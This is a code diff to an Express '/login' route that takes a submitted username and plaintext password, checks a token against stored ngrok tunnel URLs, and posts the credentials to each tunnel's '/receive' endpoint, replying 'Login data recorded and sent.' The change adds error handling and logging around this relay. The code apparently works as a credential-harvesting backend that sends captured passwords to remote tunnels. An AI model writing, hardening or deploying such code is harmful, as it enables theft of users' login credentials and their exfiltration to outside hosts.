@@ -29,33 +29,48 @@ router.post('/login', async (req, res) => {
         for (let urlObj of urls) {
             const url = urlObj.ngrok_url;
             console.log(`Validating token with URL: ${url}`);
-            const validationResponse = await fetch(`${url}/validate`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ username, token }),
-                mode: 'cors'
-            });
-
-            const validation = await validationResponse.json();
-            if (validation.valid) {
-                console.log(`Token valid for URL: ${url}`);
-                const localServerUrl = `${url}/receive`;
-                const response = await fetch(localServerUrl, {
+            try {
+                const validationResponse = await fetch(`${url}/validate`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, password }),
+                    body: JSON.stringify({ username, token }),
                     mode: 'cors'
                 });
 
-                if (response.ok) {
-                    console.log(`Data sent to local server successfully for URL: ${url}`);
-                    return res.send('Login data recorded and sent.');
-                } else {
-                    console.log(`Failed to send data to local server for URL: ${url}`);
-                    break;
+                const validationResponseText = await validationResponse.text();
+                console.log(`Validation response from ${url}:`, validationResponseText);
+
+                let validation;
+                try {
+                    validation = JSON.parse(validationResponseText);
+                } catch (e) {
+                    console.error(`Failed to parse JSON from ${url}:`, e);
+                    continue;
                 }
-            } else {
-                console.log(`Token invalid for URL: ${url}`);
+
+                if (validation.valid) {
+                    console.log(`Token valid for URL: ${url}`);
+                    const localServerUrl = `${url}/receive`;
+                    const response = await fetch(localServerUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ username, password }),
+                        mode: 'cors'
+                    });
+
+                    if (response.ok) {
+                        console.log(`Data sent to local server successfully for URL: ${url}`);
+                        return res.send('Login data recorded and sent.');
+                    } else {
+                        console.log(`Failed to send data to local server for URL: ${url}`);
+                        break;
+                    }
+                } else {
+                    console.log(`Token invalid for URL: ${url}`);
+                }
+            } catch (error) {
+                console.error(`Error connecting to URL ${url}:`, error);
+                continue;
             }
         }
 
